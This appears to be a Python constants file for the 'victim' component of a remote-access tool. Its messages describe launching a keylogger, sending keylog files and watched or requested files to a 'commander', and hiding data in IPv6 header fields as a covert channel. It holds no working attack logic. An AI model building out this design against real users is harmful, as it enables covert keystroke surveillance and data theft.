ZERO = 0
NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
MIN_PORT_RANGE = 0
MAX_PORT_RANGE = 65536
LOCAL_HOST = "localhost"
LOCAL_HOST_VALUE = "127.0.0.1"
INVALID_SRC_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the source IP address was provided "
                                    "(-s or --src_ip option): {}")
INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR = ("[+] ERROR: Invalid format provided for the source port (-c or --src_port "
                                            "option): {}")
INVALID_SRC_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for source port (-c or --src_port option) is not "
                                 "valid: (not between 0 and 65536)")
NO_SRC_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No source IP Address (-s or --src_ip option) was specified!"
NO_SRC_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No source port number (-c or --src_port option) was specified!"
VICTIM_SERVER_SOCKET_CREATION_ERROR_MSG = "[+] ERROR: An error has occurred while creating server socket: {}"
CLIENT_DISCONNECT_MSG = "[+] CLIENT DISCONNECTED: A Client (IP: {}, Port: {}) has disconnected."
WRITE_BINARY_MODE = "wb"
WAIT_CONNECTION_MSG = "[+] Waiting for a connection..."
SUCCESS_SOCKET_CREATE_MSG = "[+] SOCKET CREATED: Server has been created!"
SOCKET_INFO_MSG = "[+] Server is now listening on (IP: {}, Port: {})"
READ_MODE = "r"
KEYLOG_FILE_NAME = "keylogger.py"
EIGHT_BIT = "08b"
FOUR_BIT = "04b"
SIX_BIT = "06b"
TWO_BIT = "02b"
THREE_BIT = "03b"
THIRTEEN_BIT = "013b"
SIXTEEN_BIT = "016b"
THIRTY_TWO_BIT = "032b"
HUNDRED_TWENTY_EIGHT = "0128b"
TWENTY_BIT = "020b"
APPEND_MODE = "a"
NULL_BYTE = b'\x00'
STX_BYTE = b'\x02'

OPENING_BANNER = "===================================== || VICTIM PROGRAM || ====================================="
MENU_CLOSING_BANNER = ("==================================================================================="
                       "===============")
GET_KEYLOGGER_MSG = "GET KEYLOG"
GET_KEYLOG_REQUEST_MSG = "[+] Client has requested to transfer all recorded keylog files..."
GET_KEYLOG_CHECK_MSG = "[+] Now checking if there are any potentially recorded keylog '.txt' files..."
TRANSFER_KEYLOG_FILE_MSG = "TRANSFER FILE"
RECEIVED_CONFIRMATION_MSG = "OK"
RECEIVING_FILE_MSG = "[+] Receiving file: {}"
TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
FILE_CANNOT_OPEN_ERROR = "[+] ERROR: An error has occurred while opening {} : {}"
FILE_CANNOT_OPEN_TO_SENDER = "File has been received, but is either corrupted or not present"
VICTIM_ACK = "ACK"
CLIENT_RESPONSE = "[+] CLIENT SAYS: {}"

START_KEYLOG_MSG = "START"
CHECK_KEYLOG = "CHECK"
STATUS_TRUE = "TRUE"
STATUS_FALSE = "FALSE"
FILE_FOUND_MSG = "[+] The file {} exists in the current directory."
FILE_FOUND_MSG_TO_COMMANDER = "The file {} exists in the current directory."
FILE_NOT_FOUND_ERROR = "[+] ERROR: The file {} does not exist in the current directory."
FILE_NOT_FOUND_TO_CMDR_ERROR = "ERROR: The file {} does not exist in the current directory."
START_KEYLOGGER_PROMPT = "[+] Starting keylogger program..."
RECEIVE_FILE_NAME_PROMPT = "[+] Receiving command to check for file: {} if present..."
DO_CHECK_MSG = "[+] CHECKING FILE EXIST: Now checking if {} exists..."
EXECUTE_KEYLOG_MSG = "[+] Now executing {}..."
EXECUTE_KEYLOG_MSG_TO_CMDR = "Now executing {}..."

FAILED_IMPORT_ERROR = "[+] MISSING DEPENDENCY: Failed to import the following module: {}({})"
FAILED_IMPORT_EXCEPTION_ERROR = "[+] ERROR: An unexpected error occurred while importing {} : {}"
FAILED_IMPORT_MSG = "An unexpected error occurred while importing {} :"
KEYLOG_SUCCESS_MSG_TO_CMDR = "OPERATION SUCCESSFUL: The following file has been created: {}"
KEYLOG_SUCCESS_MSG = "[+] OPERATION SUCCESSFUL: The following file has been created: {}"
SEARCH_FILES_SUCCESSFUL_MSG = "[+] SEARCH SUCCESSFUL: There are currently {} .txt files in the current directory"
SEARCH_FILES_SUCCESSFUL_SEND = "TRUE/There are currently {} .txt files in the current directory"
SEARCH_FILES_ERROR_MSG = "[+] ERROR: There are currently no '.txt' files in the current directory."
SEARCH_FILES_ERROR_SEND = "FALSE/There are currently no '.txt' files in the current directory."
FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
FILE_END_OF_FILE_SIGNAL = b"EOF"

WATCH_FILE_SIGNAL = "WATCH FILE"
WATCH_FILE_EXISTS_MSG = "[+] FILE FOUND: The following file exists in the path specified: {}"
WATCH_FILE_NOT_EXIST_MSG = "[+] ERROR: The following file does not exist in path specified: {}"
WATCH_FILE_EXISTS_MSG_TO_CMDR = "FILE FOUND - The following file exists in the path specified: {}"
WATCH_FILE_NOT_EXIST_TO_CMDR = "ERROR: The following file does not exist in path specified: {}"
WATCH_FILE_MODIFIED = "[+] FILE MODIFIED: File {} was modified."
WATCH_FILE_DELETED = "[+] FILE DELETED: File {} was deleted."
WATCH_FILE_TRANSFER_SUCCESS = "[+] FILE TRANSFER SUCCESSFUL: {} has been sent successfully!"
WATCH_FILE_TRANSFER_FAILURE = "[+] FILE TRANSFER ERROR: An error has occurred during watch file transfer!"
WATCH_FILE_SIGNAL_THREAD_END = "[+] THREAD TERMINATION: Watch_Stop_Signal has been terminated!"
WATCH_FILE_STOPPED = "[+] WATCH FILE STOPPED: Watch file has stopped!"
WATCH_FILE_DELETE_EVENT_END_MSG = "[+] WATCH FILE END: Watch file for {} has ended"
END_OF_FILE_SIGNAL = b"EOF"
STOP_KEYWORD = "STOP"
THREAD_START_MSG = "[+] THREAD STARTED: The following thread has started: {}"
THREAD_STOPPING_MSG = "[+] STOP THREAD: Now stopping thread {}..."
THREAD_STOPPED_MSG = "[+] THREAD STOPPED: Thread has finished execution!"
BACKUP_MODIFIER = "backup"
BACKUP_FILE_CREATED_MSG = ("[+] BACKUP FILE CREATED: A backup of '{}' has been created in the "
                           "current directory and is called '{}'")

# Receive File from Commander
TRANSFER_FILE_SIGNAL = "TRANSFER"
CLIENT_TOTAL_PACKET_COUNT_MSG = "Total Number of Packets: {}"
COVERT_CONFIGURATION_FROM_CMDR = "[+] Covert Channel Configuration Chosen: {} -> {}"
COVERT_DATA_PACKET_LOCATION_MSG = "[+] Data Hidden in Packet (Header: {}, Field: {})"
CALL_MAP_FUNCTION_ERROR = "[+] TRANSFER FILE ERROR: Invalid operation while calling mapped function!"
SOURCE_ADDRESS_FIELD = "Source Address"
DESTINATION_ADDRESS_FIELD = "Destination Address"
FILE_TRANSFER_UNSUCCESSFUL = "[+] FILE TRANSFER UNSUCCESSFUL: Invalid operation was chosen!"
IPV6 = "IPv6"
NEXT_HEADER = "Next Header"
IPV6_FOUND_MSG = "[+] OPERATION SUCCESSFUL: IPV6 has been found: {}"
IPV6_OPERATION_ERROR = "[+] OPERATION UNSUCCESSFUL: An invalid IPv6 address was returned!"
IMPORT_IPV6_SCRIPT_ERROR = "{} has failed to be imported at runtime!"
INVALID_IPV6_ERROR = "[+] INVALID IPV6 ADDRESS: An error has occurred {}"
IPV6_ERROR_MSG_TO_CMDR = ("An invalid IPv6 address was returned or no IPv6 address can be "
                          "determined on victim/client machine!")

# Transfer File to Commander
GET_FILE_SIGNAL = "GET FILE"
GET_FILE_EXIST = "EXIST"
GET_FILE_NOT_EXIST = "NOT EXIST"
GET_FILE_CMDR_PATH = "[+] Client wants to receive the following file: {}"
GET_FILE_INIT_TRANSFER = "[+] Now transferring file..."
